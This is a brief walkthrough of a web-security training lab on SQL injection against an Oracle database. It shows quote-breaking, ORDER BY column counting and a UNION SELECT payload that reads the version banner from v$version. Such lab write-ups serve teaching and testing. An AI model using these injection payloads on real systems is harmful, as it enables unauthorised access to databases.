# Lab: SQL injection attack, querying the database type and version on Oracle

**End Goal:** Display the database version string.

**Analysis**

*The SQL injection vulnerability is in the product category filter so let's add ' after the category to see if the page breaks*

https://0a570071035c726180391c67006900ed.web-security-academy.net/filter?category=Accessories'

*The page broke. So the injection works. Now check how many columns are there.*

' ORDER BY 1--

*No error*

' ORDER BY 2--

*No error*

' ORDER BY 3--

*Error detected so there are only 2 columns. Now, Oracle requires the table name after FROM. Check the cheat sheet. Shows these for Oracle:*

SELECT banner FROM v$version
SELECT version FROM v$instance

*The second one only shows the version. The first one will show the string required to complete the lab.*

**Answer:** 

' UNION SELECT NULL,banner FROM v$version--


